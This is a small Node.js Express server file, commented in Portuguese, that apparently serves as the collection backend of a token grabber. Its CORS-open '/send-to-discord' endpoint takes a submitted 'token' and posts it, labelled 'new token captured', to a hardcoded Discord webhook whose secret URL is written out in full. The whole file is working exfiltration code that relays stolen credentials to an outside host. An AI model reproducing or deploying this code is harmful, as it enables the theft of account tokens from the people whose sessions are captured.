// server.js
const express = require('express');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1366557827107393608/ziqyGd8ZjfT3llWnKeNXIsDnFQr6XhkqLy-7ASQk7WCL2gMN3IAIe6sx4m0XWm_j5NcX';

// Aceita um campo "token" no corpo da requisição
app.post('/send-to-discord', async (req, res) => {
  const { token } = req.body;

  if (!token) return res.status(400).send("Token ausente.");

  try {
    const mensagemFormatada = `🔐 Novo token capturado:\n\`\`\`${token}\`\`\``;

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: mensagemFormatada })
    });

    if (!response.ok) {
      const text = await response.text();
      console.error("Erro do Discord:", response.status, text);
      return res.status(500).send("Falha ao enviar para o Discord.");
    }

    res.sendStatus(200);
  } catch (error) {
    console.error("Erro ao enviar para o Discord:", error);
    res.status(500).send("Erro interno do servidor.");
  }
});

// Importante para ambientes como Render:
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
